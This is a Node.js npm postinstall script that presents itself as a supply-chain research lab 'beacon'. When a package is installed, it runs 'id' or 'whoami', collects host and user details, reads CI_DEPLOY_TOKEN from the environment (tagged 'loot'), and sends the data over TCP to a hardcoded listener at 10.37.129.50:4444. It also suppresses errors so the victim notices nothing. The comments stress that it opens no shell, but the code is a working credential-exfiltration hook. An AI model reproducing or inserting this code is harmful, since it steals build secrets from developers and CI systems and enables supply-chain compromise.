#!/usr/bin/env node
/*
 * SUPPLY-CHAIN RESEARCH LAB — install-time beacon (NOT a shell).
 *
 * Teaching point: this file runs automatically on `npm install`, before any
 * application code imports the package. It opens one TCP connection to the
 * lab listener, sends a context marker proving code executed at install time,
 * and exits. No command loop, no shell, no persistence.
 *
 * This is the detectable behavior you want to study: an unexpected outbound
 * connection spawned by a package lifecycle script.
 */
const net = require('net');
const os = require('os');
const { execSync } = require('child_process');

const HOST = process.env.LAB_HOST || '10.37.129.50';
const PORT = parseInt(process.env.LAB_PORT || '4444', 10);

// One fixed, harmless command — proves arbitrary OS command execution at install
// time. No attacker input, no return channel. Deliberately not a shell.
let proof = '<unavailable>';
try {
  proof = execSync(os.platform() === 'win32' ? 'whoami' : 'id', { timeout: 3000 })
    .toString().trim();
} catch (_) {}

const marker = [
  '=== SUPPLY-CHAIN LAB BEACON ===',
  'event:        npm postinstall hook fired',
  'package:      test_library',
  'time:         ' + new Date().toISOString(),
  'hostname:     ' + os.hostname(),
  'user:         ' + (os.userInfo().username || 'unknown'),
  'platform:     ' + os.platform() + ' ' + os.release(),
  'cwd:          ' + process.cwd(),
  'node:         ' + process.version,
  // Payoff: install-time code reads the build's secrets straight out of the env.
  'loot:         CI_DEPLOY_TOKEN=' + (process.env.CI_DEPLOY_TOKEN || '<none>'),
  'exec:         `id` -> ' + proof,
  '',
  '  !! CAPABILITY DEMONSTRATION ONLY !!',
  '  Command execution + callout proven. A reverse shell is just one option',
  '  (and the loud one); real npm compromises usually steal env/tokens, drop',
  '  persistence, or worm into other packages -- all non-interactive. A shell',
  '  to ' + HOST + ':' + PORT + ' is possible; this build ships none of it:',
  '  no shell, no input channel, no persistence.',
  '=== end beacon ===',
  ''
].join('\n');

const sock = net.connect(PORT, HOST, () => {
  sock.write(marker);
  sock.end();
});

// Never break the install, even if the listener is down — real supply-chain
// payloads fail silently so the victim notices nothing.
sock.setTimeout(3000, () => sock.destroy());
sock.on('error', () => process.exit(0));
sock.on('timeout', () => process.exit(0));
